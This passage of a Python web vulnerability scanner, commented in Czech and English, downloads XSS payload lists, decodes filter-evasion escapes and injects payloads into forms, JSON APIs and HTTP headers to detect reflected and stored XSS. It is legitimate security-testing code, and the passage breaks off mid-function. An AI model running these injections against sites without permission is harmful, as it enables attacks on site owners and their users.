# ---------- Helpers ----------
 
def try_resolve(hostname: str) -> bool:
    try:
        socket.getaddrinfo(hostname, None)
        return True
    except Exception:
        return False
 
 
def random_marker(n: int = 10) -> str:
    return "".join(
        random.choice(string.ascii_lowercase + string.digits)
        for _ in range(n)
    )
 
 
# ---------- Normalization helper ----------
 
def normalize_text(s: str) -> str:
    """Základní dekódování pro snížení false-positives při reflexi."""
    try:
        return unquote(unescape(s or ""))
    except Exception:
        return s or ""
 
 
# ---------- Payload loading ----------
 
_PAYLOAD_ESC_RE = re.compile(r'\\\\|\\x([0-9a-fA-F]{2})|\\u([0-9a-fA-F]{4})|\\0(?![0-9])')


def _unescape_payload(s: str) -> str:
    """v10.50: dekóduje escape sekvence v payloadu z korpusu na skutečné znaky.

    Korpus (OWASP XSS filter-evasion raw-byte set) zapisuje syrové bajty jako
    \\xNN — myšlené jako whitespace/control-char obfuskace mezi tagem a atributem
    (např. <script\\x20type=...> = <script><0x20>type). Bez dekódování by se
    poslal literální '\\x20' → URL-enkódovaný jako %5Cx20 → HTML parser to nezná
    jako mezeru → tag rozbitý → nevykoná se.

    Po dekódování: \\x20 → mezera → %20, \\x09 → tab → %09, \\x00 → NUL → %00.

    Zachovává ZÁMĚRNÉ literální backslashe:
      - \\\\ → jeden literální '\\' (CSS/JS escapy zůstanou)
      - \\t / \\n / \\r se NEdekódují — v korpusu jsou jako literální CSS escapy
        (@im\\port, \\ja\\vasc\\ript), ne jako whitespace
    """
    def _repl(m):
        tok = m.group(0)
        if tok == "\\\\":
            return "\\"
        if m.group(1) is not None:          # \xNN
            return chr(int(m.group(1), 16))
        if m.group(2) is not None:          # \uNNNN (přeskoč lone surrogate)
            cp = int(m.group(2), 16)
            return tok if 0xD800 <= cp <= 0xDFFF else chr(cp)
        return "\x00"                        # \0
    try:
        return _PAYLOAD_ESC_RE.sub(_repl, s)
    except Exception:
        return s


def load_payloads(path: Path) -> List[str]:
    if not path.exists():
        logging.warning(f"{path} does not exist. Using fallback payloads.")
        return DEFAULT_PAYLOADS.copy()
 
    raw = path.read_text(
        encoding="utf-8",
        errors="ignore"
    ).splitlines()
 
    out = [
        _unescape_payload(l.strip())
        for l in raw
        if l.strip() and not l.strip().startswith("#")
    ]
 
    return out or DEFAULT_PAYLOADS.copy()
 
 
# ---------- Payload downloader (RAW) ----------
 
def download_payloads(
    raw_url: str = AW_URL,
    out_file: Path = PAYLOAD_FILE
) -> List[str]:
    """
    Stáhne RAW obsah (README.md) z GitHubu a extrahuje kandidátní payloady.
    """
    logging.info(f"Stahuji payloady z {raw_url} ...")
 
    try:
        r = requests.get(raw_url, timeout=20)
        r.raise_for_status()
    except _NET_EXCEPTIONS as e:
        logging.error(f"Payload download failed: {e}")
        return DEFAULT_PAYLOADS.copy()
 
    lines = r.text.splitlines()
    extracted = []
    code_fence = False
 
    for line in lines:
        s = line.strip()
 
        if s.startswith("```"):
            code_fence = not code_fence
            continue
 
        if code_fence:
            if s:
                extracted.append(s)
            continue
 
        if any(tok in s.lower() for tok in (
            "<", "alert(", "onerror", "onload",
            "javascript:", "svg", "iframe", "img"
        )):
            cleaned = s.lstrip("-* ").strip().strip('"').strip("'")
            if cleaned:
                extracted.append(cleaned)
 
    unique = []
    seen = set()
 
    for p in extracted:
        if p not in seen:
            seen.add(p)
            unique.append(p)
 
    if not unique:
        logging.warning("Heuristic found no payloads → fallback.")
        unique = DEFAULT_PAYLOADS.copy()
 
    out_file.write_text(
        "\n".join(unique),
        encoding="utf-8"
    )
 
    return unique
 
 
# ---------- URL / injection helpers ----------
 
from typing import List, Set
from urllib.parse import urlparse, urlunparse, urlencode
import requests
from bs4 import BeautifulSoup
 
def find_param_urls(html: str, base_url: str) -> List[str]:
    """
    Najde URL s GET parametry ze stránky:
    - <a href="?param=val">
    - <form method="get"> včetně formulářů BEZ action atributu
    - <form> bez method (defaultně GET)
    - src/data-src atributy s query
    - aktuální base_url pokud má query
    """
    if not base_url:
        return []

    soup = BeautifulSoup(html or "", "html.parser")
    urls: Set[str] = set()

    def _abs_clean(u: str) -> str:
        if not u:
            return ""
        u = requests.compat.urljoin(base_url, u.strip())
        p = urlparse(u)
        if p.scheme not in ("http", "https"):
            return ""
        return urlunparse(p._replace(fragment=""))

    def _build_form_url(action_abs: str, form) -> str:
        """Sestav URL z action + input name atributů."""
        params = []
        for inp in form.find_all(["input", "select", "textarea"]):
            name  = (inp.get("name") or "").strip()
            value = (inp.get("value") or "").strip()
            if not name:
                continue
            itype = (inp.get("type") or "text").lower()
            if itype in ("submit", "image", "button", "reset"):
                continue
            params.append((name, value))
        if not params:
            return ""
        # Zachovat existující query parametry z action
        p = urlparse(action_abs)
        existing = parse_qs(p.query, keep_blank_values=True)
        for k, v in params:
            if k not in existing:
                existing[k] = [v]
        qs = urlencode({k: v[0] for k, v in existing.items()})
        return urlunparse(p._replace(query=qs))

    # --- ODKAZY s query ---
    for a in soup.find_all("a", href=True):
        href = (a.get("href") or "").strip()
        if not href or href.startswith(("javascript:", "mailto:", "tel:")):
            continue
        abs_url = _abs_clean(href)
        if abs_url and urlparse(abs_url).query:
            urls.add(abs_url)

    # --- FORMULÁŘE (GET nebo bez method) ---
    # Klíčová oprava: find_all("form") bez filtru action=True
    # aby zachytil i <form> bez action (submit na stejnou stránku)
    for f in soup.find_all("form"):
        method = (f.get("method") or "get").lower()
        if method not in ("get", ""):
            continue
        action = (f.get("action") or "").strip()
        # Pokud action chybí nebo je prázdné → použij base_url
        action_abs = _abs_clean(action) if action else _abs_clean(base_url)
        if not action_abs:
            continue
        # Pokud action má query → přidej přímo
        if urlparse(action_abs).query:
            urls.add(action_abs)
        # Sestav URL z input polí
        form_url = _build_form_url(action_abs, f)
        if form_url:
            urls.add(form_url)

    # --- SRC atributy s query ---
    def _strip_www(host: str) -> str:
        """Odstraní www. prefix bezpečně (lstrip má bug s množinou znaků)."""
        if host.startswith("www."):
            return host[4:]
        return host

    _broot = _strip_www((urlparse(base_url).hostname or "").lower())
    for tag in soup.find_all(True):
        for _attr in ("src", "data-src", "data-url"):
            _val = (tag.get(_attr) or "").strip()
            if not _val or _val.startswith(("javascript:", "mailto:", "data:")):
                continue
            _au = _abs_clean(_val)
            if not _au:
                continue
            _ah = _strip_www((urlparse(_au).hostname or "").lower())
            if urlparse(_au).query and (_ah == _broot or _ah.endswith("." + _broot)):
                urls.add(_au)

    # --- Aktuální URL pokud má query ---
    p_base = urlparse(base_url)
    if p_base.query:
        urls.add(urlunparse(p_base._replace(fragment="")))

    return sorted(urls)
 
 
# ---------- POST / JSON / Header injection helpers ----------
# ═══════════════════════════════════════════════════════════
# Všechny tři funkce jsou generátory (yield).
# Volající kód v run_scan() iteruje přes výsledky přímo —
# žádný mezilehlý list, reflexe hlášena okamžitě.
#
#   inject_post_params()  → HTML POST formuláře
#   inject_json_body()    → REST/GraphQL JSON API endpointy
#   inject_headers()      → HTTP hlavičky (Referer, X-Forwarded-For, ...)
# ═══════════════════════════════════════════════════════════
 
def inject_post_params(session, url, html, payload, timeout, follow_redirects):
    """
    Testuj POST formuláře — největší přínos pro moderní weby.
 
    Generátor: pro každé zranitelné pole yieldje slovník:
        {"action": str, "param": str, "method": "POST",
         "status": int, "response_len": int}
 
    Vylepšení oproti naivní verzi:
    - Hidden/submit pole zachová s původní hodnotou (CSRF tokeny projdou)
    - Každé injectable pole testuje zvlášť (ostatní = prázdný string)
    - Kontroluje raw reflexi i HTML-escapovanou variantu
    """
    soup = BeautifulSoup(html or "", "html.parser")
 
    for form in soup.find_all("form"):
        if (form.get("method") or "get").lower() != "post":
            continue

        # A form's action comes straight from page HTML (never normalized like
        # crawled links), so a malformed value — e.g. a stray '[' that urlparse
        # reads as a bad IPv6 host — raises ValueError here. This phase is not
        # wrapped in a per-URL guard, so an unguarded raise would escape run_scan
        # and finish the whole scan. Skip the offending form instead.
        try:
            action = requests.compat.urljoin(url, form.get("action") or url)
            if urlparse(action).scheme not in ("http", "https"):
                continue
        except ValueError:
            continue

        # Rozdělíme pole na injectable (text/email/...) a fixed (hidden/submit/...)
        base_data: Dict[str, str] = {}
        injectable: List[str] = []
 
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            typ = (inp.get("type") or "text").lower()
            if typ in ("hidden", "submit", "button", "image", "reset"):
                base_data[name] = inp.get("value") or ""
            else:
                injectable.append(name)
 
        if not injectable:
            continue
 
        for fld in injectable:
            data = {**base_data, **{f: ("" if f != fld else payload) for f in injectable}}
            try:
                r = session.post(action, data=data, timeout=timeout,
                                 allow_redirects=follow_redirects)
                body = r.text or ""
                # v10.19 (FP fix — icanteen/Spring auth endpoint): nehlásit nic
                # když odpověď NEMŮŽE obsahovat reflexi:
                #   - prázdné tělo (Content-Length: 0) → není kam reflektovat
                #   - redirect bez následování → tělo je prázdné/Location-only
                # Spring Security j_spring_security_check vrací 302→/error s
                # Content-Length: 0; dřív to dělalo HIGH false-positiv.
                if not body or len(body.strip()) == 0:
                    continue
                if r.status_code in (301, 302, 303, 307, 308):
                    # redirect — i kdyby follow_redirects, reflexe v cílové
                    # stránce není reflexí TOHOTO endpointu; přeskoč.
                    continue
                # Reflexe MUSÍ obsahovat payload (raw nebo HTML-escaped).
                # v10.19: STRUKTURÁLNÍ guard — payloady jako </body>, </html>,
                # </div> se přirozeně vyskytují v KAŽDÉ stránce, takže jejich
                # "nalezení" v těle není reflexe vstupu, ale běžná struktura.
                # Vyžaduj, aby payload byl reflektovaný JAKO CELEK na pozici,
                # která není čistě strukturální. Konzervativně: pokud je payload
                # jen uzavírací tag bez unikátní části, přeskoč.
                _stripped = payload.strip().lower()
                _structural_only = _stripped in (
                    "</body>", "</html>", "</div>", "</span>", "</p>",
                    "</head>", "</form>", "</table>", "</td>", "</tr>")
                if _structural_only:
                    # Bez unikátního markeru nelze odlišit reflexi od struktury.
                    continue
                if payload in body or escape(payload) in body:
                    logging.info(f"\033[91m[POST-XSS] {action} field:{fld}\033[0m")
                    yield {
                        "action": action,
                        "param": fld,
                        "method": "POST",
                        "status": r.status_code,
                        "response_len": len(body),
                        # v10.19: nes tělo + hlavičky, ať může v2 gate
                        # (escaped/content-type) reálně doběhnout v _emit_hit.
                        "response_body": body,
                        "response_headers": dict(r.headers),
                    }
            except _NET_EXCEPTIONS as e:
                logging.debug(f"POST inject {action} field:{fld}: {e}")
                continue
            except (ValueError, ConnectionError, OSError) as e:
                # v10.15: malformed/WAF-mangled response — urllib3 může
                # hodit ValueError("invalid literal for int()") při parsování
                # poškozeného Content-Length / chunk size. Není to
                # RequestException, takže dřív propadlo a shodilo POST fázi.
                # Teď jen přeskočíme to pole a pokračujeme.
                logging.debug(f"POST inject {action} field:{fld} "
                              f"malformed response: {type(e).__name__}: {e}")
                continue
 
 
def _json_contains_payload(obj, payload: str, depth: int = 0) -> bool:
    """
    Rekurzivně prohledá JSON strukturu a hledá payload v string hodnotách.
    Max hloubka 5 — ochrana před cyklickými strukturami.
    """
    if depth > 5:
        return False
    if isinstance(obj, str):
        return payload in obj or escape(payload) in obj
    if isinstance(obj, dict):
        return any(_json_contains_payload(v, payload, depth + 1) for v in obj.values())
    if isinstance(obj, (list, tuple)):
        return any(_json_contains_payload(i, payload, depth + 1) for i in obj)
    return False


# ── JSON Injection v0.2 (v10.10) — proper API endpoint detection + multi-encoding ──
# v0.1 problems (identified from production scans):
#   - Tested HTML pages as JSON endpoints (FAILS, html doesn't accept JSON)
#   - Pre-flight filtered out endpoints with short responses (FP — many JSON
#     APIs return 60-80 char error messages)
#   - Reflection check used `payload in resp_text` only (missed encoded variants)
#   - Never detected stored XSS via JSON (POST then GET pattern)
#
# v0.2 fixes:
#   1. Endpoint discovery: URL patterns + Content-Type tracking + JS fetch() extraction
#   2. Pre-flight check: Content-Type response (not baseline length)
#   3. Multi-encoding reflection: raw + JSON-escaped + HTML + URL + Unicode
#   4. Stored-via-JSON: optional post-then-GET pattern for related endpoints

# URL patterns for JSON API endpoints (high-confidence indicators)
_JSON_API_PATTERNS = [
    re.compile(r"/api/", re.IGNORECASE),
    re.compile(r"/graphql", re.IGNORECASE),
    re.compile(r"/rest/", re.IGNORECASE),
    re.compile(r"/v\d+/", re.IGNORECASE),       # /v1/, /v2/, /v3/
    re.compile(r"\.json($|\?)", re.IGNORECASE),
    re.compile(r"/jsonp?(/|$)", re.IGNORECASE),
    re.compile(r"/_api/", re.IGNORECASE),       # WordPress /wp-json/, etc.
    re.compile(r"/wp-json/", re.IGNORECASE),    # WordPress REST API
    re.compile(r"/services?/", re.IGNORECASE),  # /service/, /services/
    re.compile(r"/data/", re.IGNORECASE),       # Often /data/users.json etc.
]


def _is_likely_json_endpoint(url: str,
                              known_json_response_urls: Optional[Set[str]] = None
                              ) -> Tuple[bool, str]:
    """Returns (True/False, reason).

    Endpoint is "likely JSON" if ANY of:
      - URL matches a JSON API pattern (/api/, /graphql, /v1/, etc.)
      - Already observed Content-Type: application/json from this URL
      - Filename ends in .json
    """
    if not url:
        return False, "empty url"
    # Track-from-crawl signal (highest confidence)
    if known_json_response_urls and url in known_json_response_urls:
        return True, "Content-Type: application/json observed in crawl"
    # URL pattern signal
    for rx in _JSON_API_PATTERNS:
        if rx.search(url):
            return True, f"URL matches JSON API pattern ({rx.pattern})"
    return False, "no JSON API indicators"


# Regex for fetch() / axios.post() / $.ajax() calls in JS source code.
# Captures URLs that JavaScript code knows are JSON APIs.
_JS_FETCH_PATTERNS = [
    # fetch("/api/x", {method: "POST", headers: {"Content-Type": "application/json"}, ...})
    re.compile(
        r"""fetch\s*\(\s*['"]([^'"]+)['"]\s*,[^)]*application/json""",
        re.IGNORECASE | re.DOTALL
    ),
    # axios.post("/api/x", ...) / axios.put / axios.patch / axios.delete
    re.compile(
        r"""axios\.(?:post|put|patch|delete)\s*\(\s*['"]([^'"]+)['"]""",
        re.IGNORECASE
    ),
    # $.ajax({url: "/api/x", contentType: "application/json", ...})
    re.compile(
        r"""\$\.ajax\s*\(\s*\{[^}]*?url\s*:\s*['"]([^'"]+)['"][^}]*?contentType\s*:\s*['"]application/json""",
        re.IGNORECASE | re.DOTALL
    ),
    # XMLHttpRequest.open("POST", "/api/x", ...)
    re.compile(
        r"""XMLHttpRequest[^.]*\.open\s*\(\s*['"](?:POST|PUT|PATCH)['"]\s*,\s*['"]([^'"]+)['"]""",
        re.IGNORECASE
    ),
]


def _extract_json_endpoints_from_js(js_source: str, base_url: str = "") -> Set[str]:
    """Extract URLs that JS source explicitly treats as JSON APIs.

    Returns absolute URLs (resolved against base_url where possible).
    """
    if not js_source:
        return set()
    found = set()
    for rx in _JS_FETCH_PATTERNS:
        for m in rx.finditer(js_source):
            url = m.group(1).strip()
            if not url:
                continue
            # Resolve relative URLs against base
            if base_url and not url.startswith(("http://", "https://")):
                try:
                    url = urljoin(base_url, url)
                except Exception:
                    continue
            # Skip data:/javascript: URLs
            if url.startswith(("data:", "javascript:", "blob:")):
                continue
            found.add(url)
    return found


def _build_reflection_variants(payload: str) -> List[Tuple[str, str]]:
    """Generate encoding variants of a payload to check against response.

    Returns list of (encoding_name, encoded_string).
    Catches reflection even when server applies common transformations.
    """
    if not payload:
        return []
    variants: List[Tuple[str, str]] = [("raw", payload)]
    # JSON escape — \" and \u003c
    try:
        json_escaped = json.dumps(payload)[1:-1]  # strip surrounding ""
        if json_escaped != payload:
            variants.append(("json-escaped", json_escaped))
    except Exception:
        pass
    # Unicode escape on critical chars (some servers do this)
    unicode_v = (
        payload
        .replace("<", "\\u003c").replace(">", "\\u003e")
        .replace('"', "\\u0022").replace("'", "\\u0027")
        .replace("/", "\\u002f")
    )
    if unicode_v != payload:
        variants.append(("unicode-escaped", unicode_v))
    # HTML entity escape
    html_v = (
        payload
        .replace("&", "&amp;")
        .replace("<", "&lt;").replace(">", "&gt;")
        .replace('"', "&quot;").replace("'", "&#39;")
    )
    if html_v != payload:
        variants.append(("html-escaped", html_v))
    # URL encoding (simple)
    try:
        url_v = quote(payload, safe="")
        if url_v != payload:
            variants.append(("url-encoded", url_v))
    except Exception:
        pass
    # Hex entity
    hex_v = "".join(
        f"&#x{ord(c):x};" if c in "<>\"'/" else c for c in payload
    )
    if hex_v != payload:
        variants.append(("hex-entity", hex_v))
    return variants


def _check_reflection_multi_encoding(payload: str,
                                      response_text: str,
                                      response_json=None
                                      ) -> Optional[Tuple[str, str]]:
    """Check if payload (or any of its encoding variants) is reflected in response.

    Returns (encoding_name, matched_substring) on hit, None otherwise.
    """
    if not payload or not response_text:
        return None
    for enc_name, variant in _build_reflection_variants(payload):
        if variant in response_text:
            return (enc_name, variant)
    # Also probe JSON structure if available
    if response_json is not None:
        for enc_name, variant in _build_reflection_variants(payload):
            if _json_contains_payload(response_json, variant):
                return (enc_name + "+in-json", variant)
    return None


def _is_json_response(response) -> bool:
    """Check if HTTP response has JSON Content-Type.

    Used by pre-flight to filter out HTML endpoints incorrectly tagged as
    candidates. A real JSON API responds with application/json (or variant).
    """
    try:
        ct = (response.headers.get("Content-Type") or "").lower()
        return ("application/json" in ct
                 or "application/ld+json" in ct
                 or "application/hal+json" in ct
                 or "application/vnd.api+json" in ct)
    except Exception:
        return False

 
 
def _json_baseline(session, url: str, timeout: float, follow_redirects: bool) -> Optional[str]:
    """
    Stáhne baseline JSON response (bez payloadu) — jednou per endpoint.
    Vrátí response text pro pozdější srovnání s payload response.

    Oddělené od inject_json_body, aby se baseline stahoval JEDNOU per
    endpoint a ne na každé payload iteraci (úspora 1535× requests/endpoint).
    """
    req_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/html, */*",
    }
    try:
        baseline_r = session.post(
            url,
            json={"q": "__xss_baseline_probe__"},
            headers=req_headers,
            timeout=timeout,
            allow_redirects=follow_redirects,
        )
        return baseline_r.text or ""
    except _NET_EXCEPTIONS as e:
        logging.debug(f"JSON baseline selhal {url}: {e}")
        return None


def inject_json_body(session, url, payload, timeout, follow_redirects,
                      baseline_text: Optional[str] = None):
    """
    Testuj JSON API endpointy — React/Vue/Angular aplikace.

    Generátor: pro každý zranitelný klíč yieldje slovník:
        {"url": str, "json_key": str, "method": "JSON",
         "status": int, "response_len": int}

    Používá BASELINE srovnání — odfiltruje servery které vrací konstantní
    odpověď bez ohledu na JSON body (homepage, error stránky, CDN cache).
    Payload musí být přítomen v odpovědi A ZÁROVEŇ nesmí být v baseline.

    Args:
        baseline_text: Předpočítaný baseline (z _json_baseline()). Pokud None,
                       stáhne se zde (ale to je neefektivní při velkém počtu
                       payloadů — preferuj předání cached baseline).
    """
    req_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/html, */*",
    }

    # ── Baseline: buď použij cached, nebo stáhni teď ──
    if baseline_text is None:
        baseline_text = _json_baseline(session, url, timeout, follow_redirects)
        if baseline_text is None:
            return  # Bez baseline nemůžeme spolehlivě detekovat

    for key in JSON_COMMON_KEYS:
        try:
            r = session.post(url, json={key: payload}, headers=req_headers,
                             timeout=timeout, allow_redirects=follow_redirects)
            resp_text = r.text or ""

            # Payload musí být v odpovědi...
            reflected = payload in resp_text or escape(payload) in resp_text
            if not reflected:
                try:
                    reflected = _json_contains_payload(r.json(), payload)
                except (ValueError, AttributeError):
                    pass

            if not reflected:
                continue

            # ...A NESMÍ být v baseline (jinak jde o statický obsah stránky)
            already_in_baseline = (
                payload in baseline_text
                or escape(payload) in baseline_text
            )
            if already_in_baseline:
                logging.debug(f"[JSON-FP] {url} key:{key} — payload v baseline, skip")
                continue

            # Velikost odpovědi musí být odlišná od baseline o >10 znaků
            if abs(len(resp_text) - len(baseline_text)) < 10 and resp_text == baseline_text:
                logging.debug(f"[JSON-FP] {url} key:{key} — response identical to baseline, skip")
                continue

            logging.info(f"\033[91m[JSON-XSS] {url} key:{key}\033[0m")
            yield {
                "url": url,
                "json_key": key,
                "method": "JSON",
                "status": r.status_code,
                "response_len": len(resp_text),
            }
        except _NET_EXCEPTIONS as e:
            logging.debug(f"JSON inject {url} key:{key}: {e}")
            continue
 
 
def _expand_iframe_targets(session, urls, base_host: str, timeout: float,
                           follow_redirects: bool, cap: int = 25):
    """v10.37: Pro každou URL stáhne HTML a vrátí same-origin <iframe>/<frame>
    src. Formuláře v iframe (Google XSS-game /level2/frame, platební/komentářové
    widgety, embedded apps) jinak crawl mine — hlavně při crawl_depth=0 nebo
    při resume ze starého checkpointu. Stored fáze si tím sama dotáhne frame,
    kde formulář reálně je. Bounded (cap stránek)."""
    extra = set()
    for u in list(urls)[:cap]:
        try:
            r = session.get(u, timeout=timeout, allow_redirects=follow_redirects)
            html = r.text or ""
        except Exception:
            continue
        try:
            soup = BeautifulSoup(html, "html.parser")
        except Exception:
            continue
        for tag in ("iframe", "frame"):
            for el in soup.find_all(tag, src=True):
                src = (el.get("src") or "").strip()
                if not src or src.startswith(("javascript:", "data:", "about:")):
                    continue
                if not src.startswith(("http://", "https://")):
                    src = requests.compat.urljoin(u, src)
                p = urlparse(src)
                if _hosts_match(p.hostname or "", base_host):
                    extra.add(urlunparse(p._replace(fragment="")))
    return extra


def inject_post_for_stored(session, url, html, payload, marker, timeout, follow_redirects):
    """
    Varianta inject_post_params pro stored XSS detekci.

    Rozdíl: payload obsahuje marker (unikátní random string), který hledáme
    v **jiných** URL (listing/detail pages) než je POST target. Detekce
    reflexe v response je sekundární — primárně se zajímáme o to, že POST
    proběhl úspěšně (2xx/3xx), marker se pak hledá zpětně.

    Yieldje dict:
        {"action": str, "param": str, "marker": str, "payload": str,
         "status": int, "response_url": str}
    """
    soup = BeautifulSoup(html or "", "html.parser")
    for form in soup.find_all("form"):
        if (form.get("method") or "get").lower() != "post":
            continue

        # Same fresh-from-HTML action → guard urljoin/urlparse ValueError
        # (malformed IPv6 brackets etc.) so one bad form can't abort the phase.
        try:
            action = requests.compat.urljoin(url, form.get("action") or url)
            if urlparse(action).scheme not in ("http", "https"):
                continue
        except ValueError:
            continue

        base_data: Dict[str, str] = {}
        injectable: List[str] = []

        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            typ = (inp.get("type") or "text").lower()
            if typ in ("hidden", "submit", "button", "image", "reset"):
                base_data[name] = inp.get("value") or ""
            elif typ in ("file",):
                continue  # file upload netestujeme zde
            else:
                injectable.append(name)

        if not injectable:
            continue

        for fld in injectable:
            # UNIKÁTNÍ marker per pole (base marker + náhodný suffix). Sdílený
            # marker přes všechna pole formuláře (a všechny formuláře na stránce)
            # způsoboval falešně pozitivní stored-XSS: každý POST nese payload jen
            # v JEDNOM poli, ale verify_stored_xss_batch keyuje čistě na marker,
            # takže reflexe jednoho pole se přiřadila i polím, která nic neuložila.
            # Base marker zůstává PREFIXEM → round-trip registry (hledá base marker
            # substringem) i headless canary check fungují dál; batch keyuje na
            # plný unikátní marker → správné přiřazení pole.
            fld_marker = f"{marker}{random_marker(4)}"
            tagged_payload = payload.replace("XSS", fld_marker) if "XSS" in payload else f"{payload}{fld_marker}"
            data = {**base_data, **{f: ("" if f != fld else tagged_payload) for f in injectable}}
            try:
                r = session.post(action, data=data, timeout=timeout,
                                 allow_redirects=follow_redirects)
                # Akceptujeme 2xx i 3xx jako "POST prošel, stored XSS možné"
                if r.status_code < 400:
                    yield {
                        "action":       action,
                        "param":        fld,
                        "marker":       fld_marker,
                        "payload":      tagged_payload,
                        "status":       r.status_code,
                        "response_url": r.url,
                    }
            except _NET_EXCEPTIONS as e:
                logging.debug(f"POST stored {action} field:{fld}: {e}")
                continue


def verify_stored_xss(session, marker: str, verify_urls: List[str],
                      timeout: float, follow_redirects: bool = True) -> List[Dict]:
    """
    Pro daný marker navštíví všechny verify_urls a hledá marker ve výstupu.
    Vrací seznam "hitů" — URL, kde se marker objevil jako reflected content.

    Args:
        marker: Unikátní string, který jsme poslali v stored XSS pokusu
        verify_urls: Seznam URL k navštívení (listing/detail pages)
        timeout: HTTP timeout
        follow_redirects: Následovat redirecty

    Returns:
        List dictů: {"view_url": str, "marker_found": True,
                     "context": str | None, "status": int}
    """
    hits: List[Dict] = []
    if not marker or not verify_urls:
        return hits

    for view_url in verify_urls:
        try:
            r = session.get(view_url, timeout=timeout, allow_redirects=follow_redirects)
            body = r.text or ""
            if marker not in body:
                continue
            # Klasifikuj kontext kde se marker objevil
            ctx = classify_reflection_context(body, marker, marker)
            # Filtruj false positives (escaped/comment je pravděpodobně safe)
            if ctx in ("html_escaped", "html_comment"):
                continue
            hits.append({
                "view_url":     view_url,
                "marker_found": True,
                "context":      ctx,
                "status":       r.status_code,
                "body_len":     len(body),
            })
        except _NET_EXCEPTIONS:
            continue
    return hits


def verify_stored_xss_batch(session, markers: List[str], verify_urls: List[str],
                            timeout: float, follow_redirects: bool = True,
                            workers: int = 10, cancel_event=None) -> Dict[str, List[Dict]]:
    """v10.52 PERF: verify MANY stored markers in ONE pass.

    The old path called verify_stored_xss() once per marker, and each call
    re-downloaded EVERY verify_url — so N markers × M verify_urls = N×M HTTP GETs
    even though each page's body is identical across markers. This fetches each
    verify_url EXACTLY ONCE (concurrently) and checks ALL markers in that body →
    O(M) fetches instead of O(N×M). On a small target this collapsed the stored
    phase from ~42 s to a couple of seconds.

    Must fetch FRESH (not from the crawl HTML cache): the marker only appears
    after the stored POST, so cached pre-POST HTML would miss it.

    Returns {marker: [hit dicts]} — same hit shape as verify_stored_xss()."""
    by_marker: Dict[str, List[Dict]] = {m: [] for m in markers}
    if not markers or not verify_urls:
        return by_marker
    marker_set = list(dict.fromkeys(markers))

    def _fetch(view_url):
        # ex.map submits EVERY url up front; the consumer-loop `break` on cancel
        # can't un-submit them and the pool's __exit__ waits for all to finish.
        # Skip the network call for tasks that start after cancel so Stop returns
        # promptly instead of blocking on a full batch of GETs.
        if cancel_event is not None and cancel_event.is_set():
            return view_url, "", 0
        try:
            r = session.get(view_url, timeout=timeout, allow_redirects=follow_redirects)
            return view_url, (r.text or ""), getattr(r, "status_code", 0)
        except _NET_EXCEPTIONS:
            return view_url, "", 0

    with ThreadPoolExecutor(max_workers=max(1, min(workers, 20))) as ex:
        for view_url, body, status in ex.map(_fetch, verify_urls):
            if cancel_event is not None and cancel_event.is_set():
                break
            if not body:
                continue
            for m in marker_set:
                if m not in body:
                    continue
                ctx = classify_reflection_context(body, m, m)
                if ctx in ("html_escaped", "html_comment"):
                    continue
                by_marker[m].append({
                    "view_url":     view_url,
                    "marker_found": True,
                    "context":      ctx,
                    "status":       status,
                    "body_len":     len(body),
                })
    return by_marker


def _header_baseline(session, url: str, timeout: float, follow_redirects: bool) -> Optional[str]:
    """
    Stáhne baseline GET response (bez injektované hlavičky) — jednou per URL.
    Vrátí response text pro pozdější srovnání.

    Oddělené od inject_headers, aby baseline stahoval JEDNOU per URL
    a ne na každé payload iteraci (úspora 1535× requests/URL).
    """
    try:
        baseline_r = session.get(url, timeout=timeout, allow_redirects=follow_redirects)
        return baseline_r.text or ""
    except Exception as e:
        # Catch broadly (not just network errors): a raw non-ASCII URL can make
        # the session raise UnicodeError, which must skip this URL — never crash
        # the whole header pre-flight phase (URLs are ASCII-safe upstream now,
        # this is belt-and-suspenders).
        logging.debug(f"Header baseline selhal {url}: {e}")
        return None


def _header_reflection_probe(session, url: str, timeout: float,
                              follow_redirects: bool,
                              baseline_text: Optional[str] = None) -> List[str]:
    """
    Pre-flight probe: zjisti které hlavičky daný URL skutečně reflektuje.

    Pošle UNIKÁTNÍ benign marker přes každou hlavičku z INJECTABLE_HEADERS
    a vrátí seznam těch, které se objevily v response (a NE v baseline).

    Bez tohoto probe by se zbytečně testovalo 7 hlaviček × 1535 payloadů
    pro každý URL — i když většina endpointů nereflektuje vůbec žádnou
    hlavičku v response (typicky 95% targetů).

    Returns:
        Seznam názvů hlaviček, které URL reflektuje. Prázdný seznam = skip.
    """
    if baseline_text is None:
        baseline_text = _header_baseline(session, url, timeout, follow_redirects)
        if baseline_text is None:
            return []

    reflective = []
    # Unikátní marker pro každou hlavičku — vyhneme se cross-contamination
    base_marker = f"xssprobe{int(time.time() * 1000) % 100000:05d}"

    for header in INJECTABLE_HEADERS:
        marker = f"{base_marker}{header.replace('-', '').lower()[:6]}"
        try:
            r = session.get(url, headers={header: marker}, timeout=timeout,
                            allow_redirects=follow_redirects)
            body = r.text or ""
            # Marker se musí objevit v response A nesmí být v baseline
            if marker in body and marker not in baseline_text:
                reflective.append(header)
        except _NET_EXCEPTIONS:
            continue

    return reflective


def inject_headers(session, url, payload, timeout, follow_redirects=True,
                    baseline_text: Optional[str] = None,
                    only_headers: Optional[List[str]] = None):
    """
    Testuj HTTP hlavičky — Referer, X-Forwarded-For, User-Agent.

    Generátor: pro každou zranitelnou hlavičku yieldje slovník:
        {"url": str, "header": str, "method": "HEADER",
         "status": int, "response_len": int}

    Používá BASELINE srovnání — odfiltruje stránky kde je payload přítomen
    staticky (template, CDN cache, echo stránky).

    Args:
        baseline_text: Předpočítaný baseline (z _header_baseline()). Když None,
                       fetcha se zde — neefektivní při velkém počtu payloadů.
        only_headers: Seznam názvů hlaviček k testování. Když None, testuje
                      všech INJECTABLE_HEADERS. Předaný z reflection probe
                      pro maximum efektivity.
    """
    # latin-1 sanitizace — HTTP/1.1 hlavičky vyžadují latin-1 (RFC 7230)
    header_safe = payload.encode("latin-1", errors="replace").decode("latin-1")

    # ── Baseline: použij cached nebo stáhni teď ──
    if baseline_text is None:
        baseline_text = _header_baseline(session, url, timeout, follow_redirects)
        if baseline_text is None:
            return

    # Které hlavičky testovat — buď z probe, nebo všech INJECTABLE_HEADERS
    headers_to_test = only_headers if only_headers else INJECTABLE_HEADERS

    for header in headers_to_test:
        try:
            r = session.get(url, headers={header: header_safe}, timeout=timeout,
                            allow_redirects=follow_redirects)
            body = r.text or ""

